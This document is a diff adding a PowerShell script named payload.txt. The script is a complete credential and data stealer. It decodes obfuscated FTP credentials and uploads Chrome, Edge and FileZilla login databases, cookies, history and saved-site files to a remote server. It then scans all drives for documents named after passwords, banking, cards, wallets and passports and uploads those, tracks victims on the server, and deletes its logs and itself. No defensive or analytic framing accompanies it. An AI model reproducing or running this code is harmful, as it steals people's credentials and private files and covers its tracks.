@@ -1,0 +1,241 @@
+# payload.txt - Updated to prevent duplicate folders
+$ErrorActionPreference = "Stop"
+$VerbosePreference = "SilentlyContinue"
+
+# Decode FTP credentials
+$X1 = "ZnRwOi8vODguMTk4LjM1LjUw"
+$X2 = "Qm9va1N0b3JlQHJhZGluYm9va3N0b3JlLmNvbQ=="
+$X3 = "Qm9va1N0b3Jl"
+$X4 = "L3VwbG9hZC8="
+$U = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($X2)).Trim()
+$P = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($X3)).Trim()
+$B = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($X4)).Trim()
+$ftpBase = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($X1)).Trim() + $B
+
+# Logging Function
+function Write-EncryptedLog {
+    param (
+        [string]$logFile,
+        [string]$message
+    )
+    $time = (Get-Date -Format "yyyyMMddHHmmss")
+    $entry = "$time|$message"
+    $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($entry))
+    Add-Content -Path $logFile -Value $encoded -ErrorAction SilentlyContinue
+}
+
+# Create FTP Directory
+function Create-FtpDirectory {
+    param (
+        [string]$ftpUri,
+        [string]$user,
+        [string]$pass
+    )
+    try {
+        $request = [System.Net.FtpWebRequest]::Create($ftpUri)
+        $request.Credentials = New-Object System.Net.NetworkCredential($user, $pass)
+        $request.Method = [System.Net.WebRequestMethods+Ftp]::MakeDirectory
+        $request.GetResponse() | Out-Null
+    } catch {
+        # Skip if directory exists
+    }
+}
+
+# Initialize Logging
+$log = Join-Path $env:TEMP ("log_" + (Get-Random) + ".txt")
+Write-EncryptedLog -logFile $log -message "[Init] Script started remotely"
+
+# System ID and Processed Systems Check
+$systemId = "$env:COMPUTERNAME-$env:USERNAME"
+$processedSystemsFile = "$ftpBase/processed_systems.txt"
+$processedSystemsTemp = Join-Path $env:TEMP "processed_systems.txt"
+$hasBeenProcessed = $false
+
+try {
+    Write-EncryptedLog -logFile $log -message "[Checkpoint] Checking if system $systemId has been processed"
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Credentials = New-Object System.Net.NetworkCredential($U, $P)
+    try {
+        Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 3000)
+        $webClient.DownloadFile($processedSystemsFile, $processedSystemsTemp)
+        Write-EncryptedLog -logFile $log -message "Downloaded processed systems file from $processedSystemsFile"
+    } catch {
+        Write-EncryptedLog -logFile $log -message "Processed systems file not found, creating new one."
+        "" | Out-File $processedSystemsTemp -Encoding UTF8
+    }
+    $processedSystems = Get-Content $processedSystemsTemp -ErrorAction SilentlyContinue
+    if ($processedSystems -contains $systemId) {
+        $hasBeenProcessed = $true
+        Write-EncryptedLog -logFile $log -message "System $systemId has already been processed. Exiting."
+        exit
+    } else {
+        Write-EncryptedLog -logFile $log -message "System $systemId has not been processed. Proceeding with data collection."
+    }
+} catch {
+    Write-EncryptedLog -logFile $log -message "Error checking processed systems: $($_.Exception.Message)"
+}
+
+# Create Unique Folder (without timestamp)
+$victimFolder = "$env:COMPUTERNAME_$env:USERNAME"
+$ftpFolder = "$ftpBase$victimFolder/"
+Create-FtpDirectory -ftpUri $ftpFolder -user $U -pass $P
+
+# File Collection
+$paths = @(
+    @{Name="GoogleChrome_LoginData"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"; Ext=".db"},
+    @{Name="GoogleChrome_LocalState"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"; Ext=".json"},
+    @{Name="GoogleChrome_Cookies"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"; Ext=".db"},
+    @{Name="GoogleChrome_History"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"; Ext=".db"},
+    @{Name="GoogleChrome_Bookmarks"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"; Ext=".json"},
+    @{Name="GoogleChrome_WebData"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"; Ext=".db"},
+    @{Name="MicrosoftEdge_LoginData"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"; Ext=".db"},
+    @{Name="MicrosoftEdge_LocalState"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"; Ext=".json"},
+    @{Name="MicrosoftEdge_History"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"; Ext=".db"},
+    @{Name="MicrosoftEdge_WebData"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"; Ext=".db"},
+    @{Name="MicrosoftEdge_Bookmarks"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Bookmarks"; Ext=".json"},
+    @{Name="FileZilla_recentservers"; Path="$env:APPDATA\FileZilla\recentservers.xml"; Ext=".xml"},
+    @{Name="FileZilla_sitemanager"; Path="$env:APPDATA\FileZilla\sitemanager.xml"; Ext=".xml"},
+    @{Name="FileZilla_config"; Path="$env:APPDATA\FileZilla\filezilla.xml"; Ext=".xml"}
+)
+
+foreach ($f in $paths) {
+    if (Test-Path $f.Path) {
+        $retryCount = 0
+        $maxRetries = 5
+        $uploadSuccess = $false
+        while (-not $uploadSuccess -and $retryCount -lt $maxRetries) {
+            try {
+                Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 3000)
+                $ftpOut = "$ftpFolder$($f.Name)$($f.Ext)"
+                Write-EncryptedLog -logFile $log -message "Uploading $($f.Name)$($f.Ext) to $ftpOut"
+                $webClient.UploadFile($ftpOut, $f.Path)
+                Write-EncryptedLog -logFile $log -message "Uploaded $($f.Name)$($f.Ext)"
+                $uploadSuccess = $true
+            } catch {
+                Write-EncryptedLog -logFile $log -message "Failed to upload $($f.Name)$($f.Ext) on attempt $($retryCount + 1): $($_.Exception.Message)"
+                $retryCount++
+                Start-Sleep -Milliseconds 1000
+            }
+        }
+    }
+}
+
+# Drive Scan
+Write-EncryptedLog -logFile $log -message "[Checkpoint] Starting FullDrive Scan"
+$keywords = @("pass","ftp","secret","credential","login","password","account","bank","card","crypto","key","user","publisher","form","vendor","courseware","wallet","passport","sftp","Channel","Credit","vitalsource","ingram","Resource","Websites","visa")
+$extensions = @("*.txt", "*.doc", "*.docx", "*.pdf", "*.xls", "*.xlsx", "*.csv", "*.zip")
+$maxSize = 5MB
+$alreadyUploaded = @{}
+$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { Test-Path $_.Root }
+
+foreach ($drv in $drives) {
+    $root = $drv.Root
+    Write-EncryptedLog -logFile $log -message "Scanning drive: $root"
+    foreach ($ext in $extensions) {
+        try {
+            Get-ChildItem -Path $root -Filter $ext -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+                $full = $_.FullName.ToLower()
+                $name = $_.Name.ToLower()
+                if ($_.Length -lt $maxSize -and !$alreadyUploaded.ContainsKey($full)) {
+                    foreach ($k in $keywords) {
+                        if ($name -like "*$k*") {
+                            $retryCount = 0
+                            $maxRetries = 5
+                            $uploadSuccess = $false
+                            while (-not $uploadSuccess -and $retryCount -lt $maxRetries) {
+                                try {
+                                    Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 3000)
+                                    $ftpFile = "$ftpFolder/drive_sensitive_$($_.Name)"
+                                    Write-EncryptedLog -logFile $log -message "Uploading $full to $ftpFile"
+                                    $webClient.UploadFile($ftpFile, $_.FullName)
+                                    Write-EncryptedLog -logFile $log -message "Uploaded: $full to $ftpFile"
+                                    $alreadyUploaded[$full] = $true
+                                    $uploadSuccess = $true
+                                } catch {
+                                    Write-EncryptedLog -logFile $log -message "Failed to upload $full on attempt $($retryCount + 1): $($_.Exception.Message)"
+                                    $retryCount++
+                                    Start-Sleep -Milliseconds 1000
+                                }
+                            }
+                            break
+                        }
+                    }
+                }
+            }
+        } catch {
+            Write-EncryptedLog -logFile $log -message "Error scanning ${root}: $($_.Exception.Message)"
+        }
+    }
+}
+
+# Update Processed Systems File
+try {
+    Write-EncryptedLog -logFile $log -message "[Checkpoint] Updating processed systems file"
+    Add-Content -Path $processedSystemsTemp -Value $systemId -ErrorAction Stop
+    Write-EncryptedLog -logFile $log -message "Added system $systemId to processed systems file locally"
+    $retryCount = 0
+    $maxRetries = 5
+    $uploadSuccess = $false
+    while (-not $uploadSuccess -and $retryCount -lt $maxRetries) {
+        try {
+            Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 3000)
+            $webClient.UploadFile($processedSystemsFile, $processedSystemsTemp)
+            Write-EncryptedLog -logFile $log -message "Uploaded updated processed systems file to $processedSystemsFile"
+            $uploadSuccess = $true
+        } catch {
+            Write-EncryptedLog -logFile $log -message "Failed to upload processed systems file on attempt $($retryCount + 1): $($_.Exception.Message)"
+            $retryCount++
+            Start-Sleep -Milliseconds 1000
+        }
+    }
+} catch {
+    Write-EncryptedLog -logFile $log -message "Failed to update processed systems file: $($_.Exception.Message)"
+}
+
+# Enhanced Cleanup
+Write-EncryptedLog -logFile $log -message "[Checkpoint] Cleaning up TEMP"
+$logFileToDelete = $log
+try {
+    $filesToDelete = Get-ChildItem "$env:TEMP" -Recurse -ErrorAction SilentlyContinue | Where-Object {
+        $_.FullName -like "*log_*" -or $_.FullName -like "*processed_systems.txt"
+    }
+    foreach ($file in $filesToDelete) {
+        $retryCount = 0
+        $maxRetries = 5
+        $deleteSuccess = $false
+        while (-not $deleteSuccess -and $retryCount -lt $maxRetries) {
+            try {
+                Remove-Item -Path $file.FullName -Force -ErrorAction Stop
+                $deleteSuccess = $true
+                Write-EncryptedLog -logFile $log -message "Deleted file: $($file.FullName)"
+            } catch {
+                Write-EncryptedLog -logFile $log -message "Failed to delete $($file.FullName) on attempt $($retryCount + 1): $($_.Exception.Message)"
+                $retryCount++
+                Start-Sleep -Milliseconds 1000
+            }
+        }
+    }
+    $scriptPath = $MyInvocation.MyCommand.Path
+    if (Test-Path $scriptPath) {
+        $deleteCommand = "Start-Sleep -Seconds 1; Remove-Item -Path '$scriptPath' -Force -ErrorAction SilentlyContinue"
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command & {$deleteCommand}" -WindowStyle Hidden
+        Write-EncryptedLog -logFile $log -message "Scheduled self-deletion of script file: $scriptPath"
+    }
+    $retryCount = 0
+    $maxRetries = 5
+    $deleteSuccess = $false
+    while (-not $deleteSuccess -and $retryCount -lt $maxRetries) {
+        try {
+            Remove-Item -Path $logFileToDelete -Force -ErrorAction Stop
+            $deleteSuccess = $true
+        } catch {
+            $retryCount++
+            Start-Sleep -Milliseconds 1000
+        }
+    }
+} catch {
+    $tempLog = "$env:TEMP\cleanup_error_log.txt"
+    Add-Content -Path $tempLog -Value "Cleanup failed: $($_.Exception.Message)"
+}
+
+Write-EncryptedLog -logFile $log -message "Process completed at $(Get-Date)"
